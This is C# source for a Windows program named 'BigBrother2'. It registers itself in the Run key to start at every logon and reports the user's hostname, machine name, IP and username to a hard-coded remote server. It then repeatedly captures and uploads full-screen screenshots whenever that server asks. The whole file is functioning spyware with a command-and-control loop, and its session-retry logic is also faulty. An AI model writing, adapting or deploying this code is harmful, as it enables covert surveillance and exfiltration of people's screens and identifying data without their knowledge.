using System;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Threading;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Net;
using System.Collections.Specialized;
using System.Text;
using System.Text.Json;



namespace ScreenMaker
{

    internal class Program
    {
        const string AppName = "BigBrother2";
        const string _Folder = "BigBrother2";
        const int _Interval = 25; //seconds
        const string _Server = "https://razrabotka-sajtov-v-moskve.ru/";


        static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(AppName, Application.ExecutablePath);
        }



        static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        static string GetExtermalIPAddress()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            var externalIp = IPAddress.Parse(externalIpString);
            return externalIp.ToString();
        }



        static string SaveScreenshot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bmp as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bmp.Size);

            MemoryStream ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Jpeg);
            byte[] byteImage = ms.ToArray();
            var SigBase64 = Convert.ToBase64String(byteImage); // Get Base64
            
            //SigBase64 = GetExtermalIPAddress(); // Get Base64

            //var CurrentWinDrive = Path.GetPathRoot(Environment.SystemDirectory);
            //string folderPath = @CurrentWinDrive + _Folder;

            //if (!Directory.Exists(folderPath))
                //Directory.CreateDirectory(folderPath);

            //File.WriteAllText(folderPath + "/screen.txt", SigBase64);

            //bmp.Save(folderPath + "/" + GetFileName(), ImageFormat.Jpeg);
            //bmp.Save(folderPath + "/screen.jpg", ImageFormat.Jpeg);

            return SigBase64;
        }



        static string SendRESTRequest(string url, string method, NameValueCollection data = null)
        {
            using (var wb = new WebClient())
            {
                string responseInString = "";
                try
                {
        
                    url = _Server + url;

                    dynamic response = "";
                    if (data == null)
                    {
                        response = wb.DownloadString(url);
                        response = response.ToString();
                        responseInString = response;
                    }
                    else
                    {
                        response = wb.UploadValues(url, method, data);
                        responseInString = Encoding.UTF8.GetString(response);
                    }
                }
                catch (WebException ex)
                {
                    if (ex.Status == WebExceptionStatus.Timeout)
                    {
                        return "timeout";
                    } 
                    else
                    {
                        return "error";
                    }
                }

                return responseInString;
            } 
        }

        static dynamic StartSession()
        {
            var time = DateTime.Now;
            var data = new NameValueCollection();
            data["domain"] = Dns.GetHostName();
            data["machine"] = Environment.MachineName;
            data["ip"] = GetLocalIPAddress();
            data["user"] = Environment.UserName;
            data["start_activity"] = time.ToString("yyyy-MM-dd HH:mm:ss");
            data["last_activity"] = data["start_activity"];

            var response = SendRESTRequest("api/session/create/", "POST", data);

            while (response == "timeout" || response == "error")
            {
                Thread.Sleep(60 * 1000);
                StartSession();
            }

            JsonDocument jsonDocument = JsonDocument.Parse(response);
            JsonElement root = jsonDocument.RootElement;
            JsonElement idElement = root.GetProperty("id");
            int id = Int32.Parse(idElement.ToString());

            return id;
        }

        static string SendScreenshot(int sessionId)
        {
            string SigBase64 = SaveScreenshot();
            var data = new NameValueCollection();
            var time = DateTime.Now;

            data["session"] = sessionId.ToString();
            data["screenshot"] = SigBase64;
            data["created"] = time.ToString("yyyy-MM-dd HH:mm:ss");

            return SendRESTRequest("api/screenshot/create/", "POST", data);
        }

        static string SendSessionAlive(int sessionId)
        {
            var time = DateTime.Now;
            var data = new NameValueCollection();

            data["last_activity"] = time.ToString("yyyy-MM-dd HH:mm:ss");

            var response = SendRESTRequest($"api/session/update/{sessionId}/", "PUT", data);

            return response;
        }

        static bool CheckNeedScreenshot(int sessionId)
        {
            var response = SendRESTRequest($"api/session/get/{sessionId}/", "GET");
            Console.WriteLine($"{response}\n-----");
            JsonDocument jsonDocument = JsonDocument.Parse(response);
            JsonElement root = jsonDocument.RootElement;
            JsonElement idElement = root.GetProperty("get_screenshots");
            bool getScreenshot = bool.Parse(idElement.ToString());
            return getScreenshot;
        }



        static void Main(string[] args)
        {
            SetStartup();

            int id = StartSession();
            //int id = 86;

            Console.WriteLine($"\nsession_id={id}\n");

            SendScreenshot(id);

            while (true)
            {
                
                if (CheckNeedScreenshot(id))
                {
                    SendScreenshot(id);
                }

                string response = SendSessionAlive(id);

                Console.WriteLine($"{response}\n");

                Thread.Sleep(_Interval * 1000);
            }
        }
    }
}
